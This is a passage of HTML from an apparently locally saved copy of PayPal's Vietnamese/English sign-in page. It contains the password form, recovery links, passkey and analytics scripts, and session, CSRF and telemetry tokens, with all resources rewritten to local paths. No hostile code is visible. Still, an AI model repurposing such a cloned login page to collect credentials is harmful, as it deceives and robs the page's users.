                                                <option value="ZW +263" data-code="+263" data-country="ZW">Zimbabwe (+263)</option>
                                            </select>
                                            <div class="countryPhoneSelectChoice"><span class="countryCode">VN</span><span class="phoneCode">+84</span>
                                            </div>
                                        </div>
                                        <div class="textInput" id="login_emaildiv" style="z-index: 1;">
                                            <div class="fieldWrapper">
                                                <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="username" placeholder="Email or mobile number" aria-describedby="emailErrorMessage">
                                                <label for="email" class="fieldLabel">Email or mobile number</label>
                                            </div>
                                            <div class="errorMessage" id="emailErrorMessage">
                                                <p class="emptyError hide">Required.</p>
                                                <p class="invalidError hide">That email or mobile number format isn’t right</p>
                                            </div>
                                        </div>
                                    </div>
                                    <div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
                                        <div class="textInput " id="login_passworddiv">
                                            <div class="fieldWrapper">
                                                <input id="password" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="Password" aria-describedby="passwordErrorMessage">
                                                <label for="password" class="fieldLabel">
                                                    <ya-tr-span data-index="1-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Password" data-translation="Mật khẩu," data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Password</ya-tr-span>
                                                </label>
                                                <label for="Show password" class="fieldLabel">
                                                    <ya-tr-span data-index="1-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Show password" data-translation="mật khẩu Show" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Show password</ya-tr-span>
                                                </label>
                                                <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="Show password" pa-marked="1">
                                                    <ya-tr-span data-index="1-1" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Show" data-translation="Show" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Show</ya-tr-span>
                                                </button>
                                                <label for="Hide" class="fieldLabel">
                                                    <ya-tr-span data-index="1-2" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Hide" data-translation="Hide" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Hide</ya-tr-span>
                                                </label>
                                                <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Hide" pa-marked="1">
                                                    <ya-tr-span data-index="1-3" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Hide" data-translation="Hide" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Hide</ya-tr-span>
                                                </button>
                                            </div>
                                            <div class="errorMessage" id="passwordErrorMessage">
                                                <p class="emptyError hide">Required.</p>
                                            </div>
                                        </div>
                                        <a href="https://www.paypal.com/authflow/password-recovery/?country.x=VN&amp;locale.x=en_US&amp;redirectUri=%252Fsignin%253Fcountry.x%253DVN%2526locale.x%253Den_US%2526langTgl%253Den%2526Z3JncnB0%253D" id="setupPassword" class="recoveryOption forgotPassword hide" data-client-log-action-type="clickSetupPasswordLink" pa-marked="1">
                                            <ya-tr-span data-index="2-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Set up a password" data-translation="Thiết lập một mật khẩu" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Set up a password</ya-tr-span>
                                        </a>
                                        <a href="https://www.paypal.com/authflow/password-recovery/?country.x=VN&amp;locale.x=en_US&amp;redirectUri=%252Fsignin%253Fcountry.x%253DVN%2526locale.x%253Den_US%2526langTgl%253Den%2526Z3JncnB0%253D" id="forgotPassword" class="recoveryOption forgotPassword " data-client-log-action-type="clickForgotPasswordLink" pa-marked="1">
                                            <ya-tr-span data-index="2-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Forgot password?" data-translation="Quên mật khẩu?" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Forgot password?</ya-tr-span>
                                        </a>
                                    </div>
                                </div>
                                <input type="hidden" id="phone" name="login_phone" class="validate">
                                <div class="actions">
                                    <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">
                                        <ya-tr-span data-index="3-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Log In" data-translation="Đăng Nhập" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Log In</ya-tr-span>
                                    </button>
                                </div>
                                <input type="hidden" name="splitLoginContext" value="inputPassword">
                                <input type="hidden" name="isCookiedHybridEmail" value="true">
                                <input type="hidden" name="allowPasskeyAutofill" value="true">
                            </form>
                            <div class="moreOptionsDiv  hide" id="moreOptionsContainer"><a href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" id="moreOptions" class="moreOptionsInfo" pa-marked="1">More options</a>
                                <div class="bubble-tooltip hide" id="moreOptionsDropDown">
                                    <ul class="moreoptionsGroup">
                                        <li><a href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile" pa-marked="1">Approve login using mobile device</a>
                                        </li>
                                        <li><a href="https://www.paypal.com/authflow/password-recovery/?country.x=VN&amp;locale.x=en_US&amp;redirectUri=%252Fsignin%253Fcountry.x%253DVN%2526locale.x%253Den_US%2526langTgl%253Den%2526Z3JncnB0%253D" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">Having trouble logging in?</a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                            <div id="beginOtpLogin" class="otpLoginViaButton hidden">
                                <button class="button" href="#" pa-marked="1">Log in with a one-time code</button>
                            </div>
                            <div id="tryAnotherWayLinkContainer" class="tryAnotherWayLinkContainer hide" data-hide-on-pass=""><a href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" id="tryAnotherWayLink" pa-marked="1">Try another way</a>
                            </div>
                            <div id="signupContainer" class="signupContainer " data-hide-on-email="" data-hide-on-pass="">
                                <div class="loginSignUpSeparator "><span class="textInSeparator"><ya-tr-span data-index="4-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="or" data-translation="hay" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">or</ya-tr-span></span>
                                </div>
                                <button type="button" href="/vn/webapps/mpp/account-selection" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">
                                    <ya-tr-span data-index="5-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Sign Up" data-translation="Đăng Ký" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Sign Up</ya-tr-span>
                                </button>
                            </div>
                            <div id="tpdButtonContainer" class="signupContainer hide">
                                <div class="loginSignUpSeparator"><span class="textInSeparator">or</span>
                                </div>
                                <div class="actions">
                                    <button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device" pa-marked="1">Approve login using mobile device</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="intentFooter ">
                        <div class="localeSelector  "><span class="picker country-selector"><span class="hide" id="countryPickerLink"><ya-tr-span data-index="6-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Vietnam" data-translation="Việt nam" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Vietnam</ya-tr-span></span>
                            <button type="button" aria-label="countryPickerLink" class="country VN" pa-marked="1"></button>
                            </span>
                            <ul class="localeLink">
                                <li>
                                    <a class=" scTrack:unifiedlogin-footer-language_vi_VN" href="https://www.paypal.com/signin?Z3JncnB0=&amp;country.x=VN&amp;locale.x=vi_VN&amp;langTgl=vi" lang="en" data-locale="vi_VN" pa-marked="1">
                                        <ya-tr-span data-index="7-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Tiếng Việt" data-translation="English" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Tiếng Việt</ya-tr-span>
                                    </a>
                                </li>
                                <li>
                                    <a class="selected scTrack:unifiedlogin-footer-language_en_US" href="https://www.paypal.com/signin?Z3JncnB0=&amp;country.x=VN&amp;locale.x=en_US&amp;langTgl=en" lang="en" data-locale="en_US" aria-current="”true”" pa-marked="1">
                                        <ya-tr-span data-index="8-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="English" data-translation="Tiếng anh" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">English</ya-tr-span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div id="tryAnotherWayModal" class="tryAnotherWayModal hide">
                <div class="modal-content">
                    <div class="modal-content-header">
                        <div class="modal-header-text">Try another way</div>
                        <div>
                            <button id="closeModal" type="button" class="dialog-close" aria-label="dialog-close-btn" pa-marked="1"></button>
                        </div>
                    </div>
                    <ul class="modal-content-body">
                        <li class="hide">
                            <a aria-label="Login with Touch ID or Face ID" id="loginWithWebauthn" href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" pa-marked="1">
                                <div>Log in with face, fingerprint or PIN</div>
                                <button class="chevron-right" aria-label="webauthn-chevron" pa-marked="1"></button>
                            </a>
                        </li>
                        <li class="hide">
                            <a aria-label="Login with phone one-time code" id="loginWithOtp" href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" pa-marked="1">
                                <div>Text a one-time code</div>
                                <button class="chevron-right" aria-label="phone-otc-chevron" pa-marked="1"></button>
                            </a>
                        </li>
                        <li class="hide">
                            <a aria-label="Login with email one-time code" id="loginWithEmailOtp" href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" pa-marked="1">
                                <div>Email a one-time code</div>
                                <button class="chevron-right" aria-label="email-otc-chevron" pa-marked="1"></button>
                            </a>
                        </li>
                        <li class="hide">
                            <a aria-label="Login with password" id="loginWithPassword" href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" pa-marked="1">
                                <div>Log in with your password</div>
                                <button class="chevron-right" aria-label="pwd-chevron" pa-marked="1"></button>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </section>
        <section id="verification" class="verification hide" data-role="page" data-title="Login Confirmation - PayPal">
            <div class="corral">
                <div class="contentContainer contentContainerLean">
                    <div id="pending" class="verificationSubSection">
                        <h1 class="headerText">Open the PayPal app</h1>
                        <p id="uncookiedMessage" class="verification-message hide">Open the PayPal app, tap Yes on the prompt, then tap <span class="twoDigitPin">{twoDigitPin}</span> on your phone to log in.</p>
                        <p id="cookiedMessage" class="verification-message hide">Open the PayPal app and tap Yes on the prompt to log in.</p>
                        <div class="notifications"></div>
                        <div class="accountArea"><span class="account"></span><span class="verificationNotYou"><a data-href="#" href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink" pa-marked="1">Not you?</a></span>
                        </div>
                        <div class="mobileNotification">
                            <p class="pin"></p>
                            <div class="mobileScreen"><img src="./index/icon-PN-check.png" alt="phone">
                            </div>
                        </div>
                        <p class="tryAnotherMsg"><a id="tryPasswordLink" data-href="#" href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=" class="inlineLink scTrack:try-password" pa-marked="1">Use password instead</a>
                        </p>
                        <p class="resendMsg"><a class="inlineLink scTrack:resend hide" role="button" data-href="#resend" href="https://www.paypal.com/signin?country.x=VN&amp;locale.x=en_US&amp;langTgl=en&amp;Z3JncnB0=" id="resend" pa-marked="1">Resend</a><span class="sentMessage hide">Sent</span>
                        </p>
                    </div>
                    <div id="expired" class="hide verificationSubSection">
                        <header>
                            <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long">PayPal</p>
                        </header>
                        <h1 class="headerText headerTextWarning">Sorry, we couldn't confirm it's you</h1>
                        <p class="slimP">We didn't receive a response so we were unable confirm your identity.</p>
                        <button id="expiredTryAgainButton" class="button actionsSpaced" pa-marked="1">Try Again</button>
                    </div>
                    <div id="denied" class="denied hide verificationSubSection"><img alt="" src="./index/glyph_alert_critical_big-2x.png" class="deniedCaution">
                        <h1 class="headerText">Sorry, we couldn't confirm it's you</h1>
                        <p>Need a hand?, <a href="https://www.paypal.com/%7BcoBrand%7D/cgi-bin/helpscr?cmd=_help" class="inlineLink scTrack:help" pa-marked="1">We can help</a>.</p>
                    </div>
                </div>
            </div>
        </section>
        <footer class="footer footerStayPut" role="contentinfo">
            <div class="legalFooter">
                <ul class="footerGroup">
                    <li>
                        <a target="_blank" href="https://www.paypal.com/vn/smarthelp/contact-us" pa-marked="1">
                            <ya-tr-span data-index="9-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Contact Us" data-translation="Liên Lạc Với Chúng Tôi" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Contact Us</ya-tr-span>
                        </a>
                    </li>
                    <li>
                        <a target="_blank" href="https://www.paypal.com/vn/webapps/mpp/ua/privacy-full" pa-marked="1">
                            <ya-tr-span data-index="10-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Privacy" data-translation="Chính" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Privacy</ya-tr-span>
                        </a>
                    </li>
                    <li>
                        <a target="_blank" href="https://www.paypal.com/vn/webapps/mpp/ua/legalhub-full" pa-marked="1">
                            <ya-tr-span data-index="11-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Legal" data-translation="Pháp lý" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Legal</ya-tr-span>
                        </a>
                    </li>
                    <li>
                        <a target="_blank" href="https://www.paypal.com/vn/webapps/mpp/ua/upcoming-policies-full" pa-marked="1">
                            <ya-tr-span data-index="12-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Policy Updates" data-translation="Mật Thông Tin Cập Nhật" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Policy Updates</ya-tr-span>
                        </a>
                    </li>
                    <li>
                        <a target="_blank" href="https://www.paypal.com/vn/webapps/mpp/country-worldwide" pa-marked="1">
                            <ya-tr-span data-index="13-0" data-translated="false" data-source-lang="en" data-target-lang="vi" data-value="Worldwide" data-translation="Trên toàn thế giới" data-ch="0" data-type="trSpan" style="visibility: inherit !important;">Worldwide</ya-tr-span>
                        </a>
                    </li>
                </ul>
            </div>
        </footer>
        <div id="ccpaCookieBanner" class="ccpaCookieBanner_container ccpaHideCookieBannerMobile" style="display: none;">
            <div id="ccpaCookieContent_wrapper" class="ccpaCookieBanner_content-container" style="display: none;"></div>
            <div class="ccpaCookieBanner_buttonGroup">
                <div class="ccpaCookieBanner_buttonWrapper"></div>
            </div>
        </div>
    </div>
    <div class="transitioning hide" aria-busy="false">
        <p class="welcomeMessage hide">Welcome, !</p>
        <p class="checkingInfo hide">Checking your info…</p>
        <p class="oneSecond hide">Just a second…</p>
        <p class="secureMessage hide">Securely logging you in...</p>
        <p class="oneTouchMessage hide"></p>
        <p class="retrieveInfo hide">Retrieving your information...</p>
        <p class="waitFewSecs hide">This may take a few seconds...</p>
        <p class="udtSpinnerMessage udtLogin hide">We recognize you on this device, and we’re securely logging you in.</p>
        <p class="udtSpinnerMessage udtLoginXo hide">We recognize you on this device, so no need to enter your password for this purchase.</p>
        <p class="udtSpinnerMessage webllsXoUS hide">We recognize you on this device, so you can skip login.
            <br>
            <br>Manage this setting in your profile.</p>
        <p class="udtSpinnerMessage webllsSCA hide">We're taking you to PayPal Checkout to complete payment.</p>
        <p class="qrcMessage hide">Redirecting...</p>
        <p class="webAuthnOptin hide">Updating your login settings...</p>
        <p class="webAuthnLogin hide">Logging you in...</p>
        <div class="keychain spinner-content uiExp hide"></div>
    </div>
    <script nonce="" type="text/javascript" src="./index/index.js"></script>
    <script nonce="">
        var autofillAbortController;
        if (window.AbortController) {
            autofillAbortController = new AbortController();
        }(function setPasskeyContext() {
            function str2buff(str) {
                return Uint8Array.from(atob(str), function(c) {
                    return c.charCodeAt(0);
                });
            }

            function buff2str(strBuff) {
                return btoa(new Uint8Array(strBuff).reduce(function(s, byte) {
                    return s + String.fromCharCode(byte)
                }, ''));
            }

            function getAssertion() {
                var authAbortSignal = autofillAbortController.signal;
                var payload = {
                    'publicKey': {
                        challenge: str2buff("21f7f170c2034cb3ae304675095f54ae"),
                        rpId: "www.paypal.com"
                    },
                    'mediation': 'conditional',
                    'signal': authAbortSignal
                };
                return navigator.credentials.get(payload);
            }

            function setAssertion(assertion) {
                var publicKeyCredential = {};
                if ('id' in assertion) {
                    publicKeyCredential.id = assertion.id;
                }
                if ('type' in assertion) {
                    publicKeyCredential.type = assertion.type;
                }
                if ('rawId' in assertion) {
                    publicKeyCredential.rawId = buff2str(assertion.rawId);
                }
                if ('response' in assertion) {
                    var response = {};
                    response.clientDataJSON = buff2str(assertion.response.clientDataJSON);
                    response.authenticatorData = buff2str(assertion.response.authenticatorData);
                    response.signature = buff2str(assertion.response.signature);
                    response.userHandle = buff2str(assertion.response.userHandle);
                    publicKeyCredential.response = response;
                    document.body.setAttribute('data-passkey-assertion', JSON.stringify(publicKeyCredential));
                }
            }
            if (window.PublicKeyCredential && window.PublicKeyCredential.isConditionalMediationAvailable && window.PublicKeyCredential.isConditionalMediationAvailable()) {
                document.body.focus();
                getAssertion().then(function(assertion) {
                    setAssertion(assertion);
                }).catch(function(e) {});
            }
        }());
    </script>
    <script nonce="">
        var PAYPAL = PAYPAL || {};
        PAYPAL.slData = {
            "slSessionChkTimeout": "",
            "slOptInTimeout": "",
            "slAuthChkTimeout": "",
            "slTokenValidationTimeout": "",
            "slDisplayMerchantLink": "",
            "slAction": "",
            "smartlockStatus": "",
            "slLinkedEmail": "",
            "slFrameSrc": "",
            "slAuthUrl": "",
            "partnerClientId": "",
            "partnerReturnUri": "",
            "scimContextId": "",
            "slOptInOT": "",
            "slLoginEmail": "",
            "slReturnUrl": "",
            "delayPartnerAssertion": "",
            "googleOneTapEnable": ""
        };
    </script>
    <script nonce="">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulData = {
            fnUrl: "" || "https://c.paypal.com/da/r/fb_fp.js",
            fnSessionId: "d6ac1ab9ca0749569461402a96535d90",
            sourceId: "UNIFIED_LOGIN_INPUT_PASSWORD_TRMT",
            beaconUrl: "https://b.stats.paypal.com/v1/counter.cgi?r=cD1kNmFjMWFiOWNhMDc0OTU2OTQ2MTQwMmE5NjUzNWQ5MCZpPTEuNTMuMjIxLjY0JnQ9MTczMDkwMjk3NS40NCZhPTIxJnM9VU5JRklFRF9MT0dJTmv5KwNm8OK9oQI5sioB55FJPG8P",
            enableSpeedTyping: "true",
            aPayAuth: "",
            aPayCanMakePaymentTimeout: "",
            tokenAssertionUri: "",
            preloadScriptUrl: "",
            preloadScriptDownloadLength: 0,
            fingerprintProceed: "lookup",
            isSandbox: ""
        };
    </script>
    <noscript><img src="https://c.paypal.com/v1/r/d/b/ns?f=d6ac1ab9ca0749569461402a96535d90&s=UNIFIED_LOGIN_INPUT_PASSWORD_TRMT&js=0&r=1" title="ppfniframe" alt="" height="1" width="1" border="0">
    </noscript>
    <script nonce="" id="ul-sync-data">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulSync = {
            fnSessionId: 'd6ac1ab9ca0749569461402a96535d90',
            sourceId: 'UNIFIED_LOGIN_INPUT_PASSWORD_TRMT',
            fname: 'fn_sync_data',
            isFnWithoutIframeEnabled: 'true'
        };
    </script>
    <script nonce="" src="./index/fn-sync-telemetry-min.js"></script>
    <script nonce="">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulData = PAYPAL.ulData || {};
        PAYPAL.ulData.incontextData = {
            "version": "",
            "noBridge": "",
            "env": "",
            "icstage": "",
            "targetCancelUrl": "",
            "paymentAction": "",
            "paymentToken": "",
            "merchantID": ""
        };
    </script>
    <!-- build:js inline -->
    <!-- build:[src] js/ -->
    <script nonce="" src="./index/signin-split.js"></script>
    <!-- /build -->
    <!-- /build -->
    <!-- build:js inline -->
    <!-- build:[src] js/ -->
    <script nonce="" src="./index/ioc.js"></script>
    <!-- /build -->
    <!-- /build -->
    <script src="./index/pa.js"></script>
    <script nonce="">
        var fptiOptions = {
            data: 'pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&pgst=1730902975387&calc=0121526614057&nsid=ScVRSvQb2fXLjXueByL4rH79miIh2JoE&rsta=en_US&pgtf=Nodejs&env=live&s=ci&ccpg=VN&csci=21f7f170c2034cb3ae304675095f54ae&comp=unifiedloginnodeweb&tsrce=authchallengenodeweb&cu=1&ef_policy=ccpa&c_prefs=T%3D0%2CP%3D1%2CF%3D1%2Ctype%3Dimplicit&transition_name=ss_prepare_pwd&userRedirected=true&xe=101735%2C101216%2C104200%2C105351%2C108652%2C109195%2C108076%2C109047&xt=105856%2C103864%2C127485%2C123678%2C141149%2C144027%2C138090%2C143343&ctx_login_ot_content=0&obex=signin&landing_page=login&browser_client_type=Browser&state_name=begin_pwd&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F',
            url: 'https:\/\/t.paypal.com\/ts'
        };
        var trackLazyData = "true" === "true";
        if (trackLazyData) {
            fptiOptions = {...fptiOptions, trackLazyData: true, lazyDataId: 'UnifiedLoginNodeWeb'
            };
        }(function() {
            if (typeof PAYPAL.analytics != "undefined") {
                PAYPAL.core = PAYPAL.core || {};
                PAYPAL.core.pta = PAYPAL.analytics.setup(fptiOptions);
            }
        }());
    </script>
    <noscript><img src="https://t.paypal.com/ts?nojs=1&pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&pgst=1730902975387&calc=0121526614057&nsid=ScVRSvQb2fXLjXueByL4rH79miIh2JoE&rsta=en_US&pgtf=Nodejs&env=live&s=ci&ccpg=VN&csci=21f7f170c2034cb3ae304675095f54ae&comp=unifiedloginnodeweb&tsrce=authchallengenodeweb&cu=1&ef_policy=ccpa&c_prefs=T%3D0%2CP%3D1%2CF%3D1%2Ctype%3Dimplicit&transition_name=ss_prepare_pwd&userRedirected=true&xe=101735%2C101216%2C104200%2C105351%2C108652%2C109195%2C108076%2C109047&xt=105856%2C103864%2C127485%2C123678%2C141149%2C144027%2C138090%2C143343&ctx_login_ot_content=0&obex=signin&landing_page=login&browser_client_type=Browser&state_name=begin_pwd&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F" alt="" height="1" width="1" border="0">
    </noscript>
    <script nonce="" async="" src="./index/datadog-rum.js"></script>
    <script id="datadog-rum" nonce="">
        window.DD_RUM || = {
            q: [],
            onReady: function(c) {
                this.q.push(c);
            }
        };
        window.DD_RUM.onReady(function() {
            window.DD_RUM.init({
                clientToken: "pubfa2a063cbe1e1dd735fe2d7af81a244e",
                applicationId: "cc878d04-1c0d-492b-a5a7-cb4daa889283",
                site: 'us5.datadoghq.com',
                service: 'unifiedloginnodeweb',
                sessionSampleRate: 100,
                sessionReplaySampleRate: 100,
                trackUserInteractions: true,
                trackResources: true,
                trackLongTasks: true,
                defaultPrivacyLevel: 'mask-user-input',
            });
        });
    </script>
    <script async="" id="grcv3enterpriseframetag" data-key="6LdCCOUUAAAAAHTE-Snr6hi4HJGtJk_d1_ce-gWB" data-action="unifiedloginnodeweb" data-sessionid="_sessionID=ScVRSvQb2fXLjXueByL4rH79miIh2JoE" data-src="https://www.paypalobjects.com/webcaptcha/grcenterprise_v3_static.html" data-submiturl="/auth/verifygrcenterprise" data-csrf="YbvwtbgmQSSAdZLb28fOD7oOt2A7RTIMHgxAY=" data-f="d6ac1ab9ca0749569461402a96535d90" src="./index/grcenterprise_v3_static.js"></script>
    <script crossorigin="anonymous" src="./index/patleaf.js"></script>
    <iframe id="grcv3enterpriseframe" src="./index/grcenterprise_v3_static.html" sandbox="allow-same-origin allow-scripts allow-popups" style="position: fixed; bottom: 30px; right: 1.5px; width: 74px; transition: width 0.3s; height: 66px; border: 0px; z-index: 2147483000; display: none;"></iframe>
    <script crossorigin="anonymous" src="./index/patlcfg.js"></script>
    <script id="fconfig" type="application/json" fncls="fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99" nonce="">{"f":"d6ac1ab9ca0749569461402a96535d90","s":"UNIFIED_LOGIN_INPUT_PASSWORD_TRMT","b":"https://b.stats.paypal.com/v1/counter.cgi?r=cD1kNmFjMWFiOWNhMDc0OTU2OTQ2MTQwMmE5NjUzNWQ5MCZpPTEuNTMuMjIxLjY0JnQ9MTczMDkwMjk3NS40NCZhPTIxJnM9VU5JRklFRF9MT0dJTmv5KwNm8OK9oQI5sioB55FJPG8P","ts":{"type":"UL","fields":[{"id":"email","min":6},{"id":"password","min":6}],"delegate":false}}</script>
    <script src="./index/fb_fp.js"></script>
    <iframe id="ppfnfnclspbfiframe" src="./index/saved_resource(1).html" title="pbf" tabindex="-1" style="width: 0px; height: 0px; border: 0px; position: absolute; z-index: -999; top: -10000px; left: -10000px;" aria-hidden="true"></iframe>
    <script nonce="">
        (function() {
            var bannerFptiData = {};

            function getFptiReqData() {
                let fptiReqData = window && window.fpti && window.PAYPAL && window.PAYPAL.analytics && window.PAYPAL.analytics.instance && window.PAYPAL.analytics.instance.options && window.PAYPAL.analytics.instance.options.request && window.PAYPAL.analytics.instance.options.request.data;
                if (fptiReqData) {
                    bannerFptiData = {
                        api_name: 'cookieBanner',
                        page: 'main:privacy:policy:ccpa',
                        pgrp: 'main:privacy:policy',
                        displaypage: window.fpti.pgrp,
                        ppage: 'privacy_banner',
                        bannertype: 'cookiebanner',
                        ccpg: 'VN',
                        flag: 'ccpa',
                        bannerversion: 'v6',
                        bannersource: 'ConsentNodeServ',
                        bannervariant: 'hidden',
                        xe: '105410,105409,104759,109059,104407',
                        xt: '123956,123954,136601,143369,119038',
                        eligibility_reason: 'true',
                        is_native: 'false',
                        cookie_disabled: cookieDisabled(),
                        reason_to_hide: reasonToHideBanner()
                    };
                    if (false) {
                        bannerFptiData = {...bannerFptiData, userstate: 'undefined', usercountry: 'undefined', stateaccuracy: 'undefined', countryaccuracy: 'undefined', loggedin: 'undefined'
                        }
                    }
                }
                return fptiReqData;
            }

            function getFptiPage() {
                return getFptiReqData() && getFptiReqData().page;
            }

            function setSessionStorage(key) {
                try {
                    sessionStorage.setItem(key, true);
                } catch (e) {
                    console.log('error on setting sessioStorage', e);
                }
            }

            function isBannerClosed() {
                let is_banner_closed = false;
                try {
                    if (sessionStorage.getItem("isBannerClosed") || sessionStorage.getItem("isUserAccepted") || sessionStorage.getItem("isInvisibleBanner")) {
                        is_banner_closed = true;
                    }
                } catch (e) {
                    is_banner_closed = false;
                }
                return is_banner_closed || (false && true && !navigator.cookieEnabled);
            }

            function reasonToHideBanner() {
                let reason = '';
                try {
                    if (false && true && !navigator.cookieEnabled) {
                        reason = 'cookies are disabled';
                    } else if (sessionStorage.getItem("isUserAccepted")) {
                        reason = 'User accepted or declined';
                    } else if (sessionStorage.getItem("isBannerClosed")) {
                        reason = 'Banner Closed';
                    } else if (sessionStorage.getItem("isInvisibleBanner")) {
                        reason = 'Invisible banner loaded';
                    }
                } catch (error) {
                    reason = '';
                }
                return reason;
            }

            function cookieFilteringRequest(eventSource) {
                const page = window && window.fpti && window.fpti.page || window && window.location && window.location.href;
                const component = window && window.fpti && window.fpti.comp || "";
                let eventSourceUrl = window && window.location && window.location.href || '';
                eventSourceUrl = eventSourceUrl.split("?")[0];
                const xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHTTP');
                const endPoint = "https://www.paypal.com/myaccount/privacy/cookieprefs/cookies?eventSource=" + eventSource + "&page=" + page + "&component=" + component + "&eventSourceUrl=" + eventSourceUrl;
                xhr.open('GET', endPoint);
                xhr.withCredentials = true;
                xhr.onreadystatechange = function() {
                    if (xhr.readyState > 3 && xhr.status === 200) {}
                };
                xhr.setRequestHeader('Accept', 'application/json');
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send();
            };

            function cookieFiltering(eventSource = "cookieBanner") {
                if (!true || false) {
                    return;
                }
                cookieFilteringRequest(eventSource);
            }

            function postAjax(isFptiDataAvailable, cookieObj) {
                if (!isFptiDataAvailable && getFptiReqData()) {
                    isFptiDataAvailable = true;
                }
                if (isFptiDataAvailable) {
                    acceptDeclineFptiEvents(cookieObj);
                }
                var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
                var endPoint = cookieObj.endPointPrefix + cookieObj.endPointSuffix;
                xhr.open('GET', endPoint);
                xhr.withCredentials = true;
                xhr.onreadystatechange = function() {
                    if (xhr.readyState > 3 && xhr.status == 200) {
                        cookieFiltering(cookieObj.eventSource);
                    }
                };
                xhr.setRequestHeader('Accept', 'application/json', 'Content-Type', 'application/json');
                xhr.send(null);
                return xhr;
            };

            function fptiRecordClick(bannerData) {
                window.PAYPAL.analytics.Analytics.prototype.recordClick({
                    data: {...bannerData, product: "cookieBanner"
                    }
                });
            };

            function acceptDeclineFptiEvents(cookieObj) {
                var trackingPageName = '' || getFptiPage() || document.title;
                var cookiesText = cookieObj.cookiesText;
                var cookiePrefs = cookieObj.cookiePrefs;
                var eventName = cookieObj.eventName;
                var bannerData = {
